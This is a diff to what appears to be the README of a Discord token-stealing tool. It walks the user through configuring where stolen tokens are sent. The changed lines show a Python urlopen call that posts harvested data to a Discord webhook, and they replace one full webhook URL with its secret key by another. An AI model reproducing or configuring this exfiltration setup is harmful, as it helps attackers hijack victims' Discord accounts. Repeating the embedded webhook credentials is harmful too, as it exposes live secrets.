@@ -41,8 +41,8 @@ If you want to change were it sends the token to.
 5. scroll down to the last line before the blank (big gap in code) near the bottom 
  were it says 
 try:
-        urlopen(Request("https://discord.com/api/webhooks/840487083444535366/0WIjgINkadXvuOMXOdwNahKFVROWtq-_ktGhPLLdZSy4b0QZo-2rljJWCabkaC9I-oQJ", data=dumps(webhook).encode(), headers=getheaders())) ![Screenshot 2021-05-09 150239](https://user-images.githubusercontent.com/83868916/117561194-d997e600-b0d7-11eb-8225-0bb6d77fa324.png)
-6. change the "https://discord.com/api/webhooks/840487083444535366/0WIjgINkadXvuOMXOdwNahKFVROWtq-_ktGhPLLdZSy4b0QZo-2rljJWCabkaC9I-oQJ" to your webhook url ![Screenshot 2021-05-09 150300](https://user-images.githubusercontent.com/83868916/117561195-dac91300-b0d7-11eb-9494-a55d8f6e5276.png)
+        urlopen(Request("https://discord.com/api/webhooks/842670576677814292/x6AJt5CcuKtDX4JzZpPxztOsOXYHs0NFWv2i6ASDiw37AusGXgo9fT2GaJBCIAGQn8fE", data=dumps(webhook).encode(), headers=getheaders())) ![Screenshot 2021-05-09 150239](https://user-images.githubusercontent.com/83868916/117561194-d997e600-b0d7-11eb-8225-0bb6d77fa324.png)
+6. change the "https://discord.com/api/webhooks/842670576677814292/x6AJt5CcuKtDX4JzZpPxztOsOXYHs0NFWv2i6ASDiw37AusGXgo9fT2GaJBCIAGQn8fE" to your webhook url ![Screenshot 2021-05-09 150300](https://user-images.githubusercontent.com/83868916/117561195-dac91300-b0d7-11eb-9494-a55d8f6e5276.png)
 
 7. save the file ![Screenshot 2021-05-09 151713](https://user-images.githubusercontent.com/83868916/117561385-b2421880-b0d9-11eb-98c4-00c3641d6ba6.png)
 
